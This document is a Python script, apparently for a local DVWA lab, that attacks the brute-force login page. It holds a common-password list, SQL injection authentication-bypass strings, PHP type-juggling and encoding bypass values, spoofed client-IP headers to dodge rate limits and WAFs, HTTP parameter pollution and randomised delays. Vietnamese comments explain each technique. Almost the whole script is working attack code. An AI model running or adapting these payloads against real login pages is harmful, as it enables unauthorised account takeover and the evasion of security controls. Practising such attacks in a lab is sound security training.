import requests, time, random
TARGET = 'http://localhost:8080/vulnerabilities/brute/'
COOKIES = {'PHPSESSID': '278ab58002dbd5f0e20387685d3f6a8e', 'security': 'low'}
PAYLOADS = [
    # --- Basic Brute Force (Common Dictionaries) ---
    'password', '123456', 'admin', 'root', '12345678', '1234', '12345', '123456789', 'qwerty', '111111',
    'admin123', 'admin1234', 'admin1', 'superuser', 'administrator', 'system', 'sysadmin', 'guest',
    'password123', 'P@ssw0rd', 'Welcome1', 'changeme', 'letmein',

    # --- SQL Injection Auth Bypasses (Authentication Bypass) ---
    "' OR '1'='1", "' OR 1=1--", "admin' #", '" OR ""="', "' OR 'x'='x", "' OR TRUE--", 
    "' UNION SELECT 1,2,3--", "admin'/*", "' OR 1=1#", "admin' AND 1=1#",
    "' or 1=1 limit 1 -- -+", "'='", "admin' OR '1'='1'/*", "' OR '1'='1' ({",
    
    # --- PHP Type Juggling & Array Bypass (Broken Logic) ---
    # Trong PHP, nếu backend dùng strcmp() lỏng lẻo, truyền array vào sẽ làm hàm trả về 0 (True)
    # Tuy requests python không truyền array thẳng qua chuỗi này được, nhưng ta mô phỏng logic:
    "a[]", "1e3", "0e12345", "true", "NULL",

    # --- Unicode / Encoding Bypasses ---
    "%bf%27 OR 1=1--", # Multi-byte SQLi
    "admin%00",        # Null Byte Bypass
    "%27%20OR%201%3D1", # Full URL Encode
]

# Danh sách các Header dùng để Bypass Rate Limit / IP Restrict (Thuộc nhóm Broken Access Control)
SPOOFED_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'}
]

print('--- A01: Broken Access Control (Advanced Brute Force & Rate Limit Bypass) ---')
for idx, p in enumerate(PAYLOADS):
    # Chọn ngẫu nhiên 1 header giả mạo IP nội bộ để lừa Firewall/WAF (Rate Limit Bypass / BAC)
    spoofed_header = random.choice(SPOOFED_HEADERS)
    
    # Kỹ thuật HTTP Parameter Pollution (HPP): Truyền 2 lần tham số 'username'
    # Backend có thể check username 1, nhưng xử lý authentication với username 2
    params = {
        'username': ['user', 'admin'], # HPP: ?username=user&username=admin
        'password': p, 
        'Login': 'Login'
    }
    
    res = requests.get(TARGET, params=params, cookies=COOKIES, headers=spoofed_header)
    print(f'[*] [IP Spoofed: {list(spoofed_header.values())[0]}] Pass: {p[:15]:<15} -> Status: {res.status_code}')
    time.sleep(random.uniform(0.1, 0.3))
